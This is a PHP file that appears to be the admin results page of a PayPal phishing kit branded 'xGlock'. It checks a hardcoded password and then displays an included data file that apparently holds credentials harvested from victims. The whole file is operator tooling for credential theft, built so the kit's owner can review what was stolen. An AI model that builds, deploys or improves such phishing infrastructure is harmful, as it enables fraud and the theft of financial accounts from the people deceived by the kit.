<?php
session_start();
$pass = "xGlock";
$form = "
<!DOCTYPE html><html><head><title>xGLOCK - Result</title><link rel='stylesheet' type='text/css' href='style.css'><link rel='shortcut icon' type='image/x-icon' href='../Xwanted/assets/pp_favicon_x.ico'><link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet'><style type='text/css'>body{margin: 0;padding: 0;box-sizing: border-box;background-color: #080808;font-family: 'Iceland', sans-serif;}img{margin-bottom: 90px;height: 80px;}h1{color: #fff;font-size: 30px;}input{width: 400px;height: 50px;border-radius: 5px;padding: 10px 15px;border: 2px solid #fff;outline: none;box-sizing: border-box;color: #fff;font-size: 19px;background-color: #080808;}input:hover{box-shadow: 0 0 20px rgb(255,255,255);}button{height: 50px;width: 400px;border-radius: 5px;font-weight: bold;color: #fff;outline: none;border: 2px solid #fff;background-color: #080808;font-size: 20px;letter-spacing: 0.5px;cursor: pointer;transition: 0.2s;}button:hover{box-shadow: 0 0 20px rgb(255,255,255);border: 2px solid #080808;background-color: #fff;color: #080808;}@media only screen and (min-device-width : 220px) and (max-device-width : 480px) {img{width: 15%;height: auto;}button{height: 120px;width: 88%;font-size: 35px;margin-top: 40px;}input{height: 120px;width: 88%;font-size: 33px;padding: 10px 40px;}h1{margin-top: 100px;font-size: 60px!important;}}</style></head><body><center><form 	ction='' method='POST'><h1 style='font-size: 40px;color: #fff;'><span style='color: red;font-size: 60px;'>[!]</span><span style='color: green;font-size: 60px;'>-</span> Welcome To The <span style='color: red;'>Admin</span> Page <span style='color: green;font-size: 60px;'>-</span><span style='color: red;font-size: 60px;'>[!]</span></h1><br><br><img src='../Xwanted/assets/paypal.png' alt=''><br><br><input type='password' name='pass' placeholder='Password'><br><br><button name='sub'>Get My Fucking Result</button></form></center></body></html>
";
if (isset($_POST['sub'])) {
    if ($_POST['pass'] == $pass) {
        $_SESSION['xGlock'] = true;
    }else{
        $_SESSION['xGlock'] = false;
        die("{$form} <script type='text/javascript'>alert('Wrong Password !');</script>");
    }
}
if ($_SESSION['xGlock'] == false) {
    echo $form;
    exit();
}
if($_GET['log'] == 'out'){
	session_destroy();
	header("Location: ../admin");
}
?>
<!DOCTYPE html>
<html>
<head>
	<title>xGlock - Rezlt</title>
	<meta charset="utf-8">
	<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" type="text/css" href="data/style.css">
	<link rel='shortcut icon' type='image/x-icon' href='../Xwanted/assets/img/favicon.ico'>
</head>
<body>
<center>
<a href="?log=out" class="btn btn-info btn-lg" style="background-color: #007bff;">Log out<i class="fa fa-sign-out" aria-hidden="true" style="margin-left: 10px;"></i></a>
<div class="container">



<?php include 'data/data.html'; ?>



</div>
</center>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="Xwanted.js"></script>
</body>
</html>